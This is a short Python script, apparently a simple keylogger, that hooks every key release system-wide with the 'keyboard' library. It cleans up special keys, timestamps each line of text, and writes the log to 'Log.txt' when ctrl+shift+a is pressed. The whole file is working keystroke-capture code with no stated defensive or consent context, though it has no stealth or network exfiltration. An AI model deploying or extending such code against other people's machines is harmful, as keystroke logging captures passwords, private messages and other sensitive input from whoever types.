import keyboard
from datetime import datetime, date


class Logger:

    def __init__(self):
        self.log = ""
        self.line = ""
        self.line_length = 20
        self.log_filename = "Log.txt"

    def callback(self, event):
        """When a stroke happen this function is called"""

        name = event.name

        exception_key = ["backspace", "delete", "left", "right", "up", "down", "shift",
                         "ctrl", "right shift", "alt", "tab", ]
        # print(name)

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name in exception_key:
                name = ""

        self.line += name

        if name == " ":
            self.count_line()

    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait(hotkey='ctrl+shift+a')
        print(self.log)
        self.write_log()

    def count_line(self):
        """Take a line and return True if it's become too long"""

        if len(self.line) >= self.line_length:
            self.add_timestamp()
            self.log += "\n" + self.line
            self.line = ""

    def add_timestamp(self):
        """Take the line and add time stamp"""

        now = datetime.now()
        time_string = now.strftime("%Y-%m-%d %H:%M:%S")
        self.line = time_string + ":  " + self.line

    def write_log(self):
        """Take the log and write it into a file"""

        with open(self.log_filename, 'w') as a:
            a.write(self.log)



if __name__ == '__main__':

    a = Logger()
    a.start()


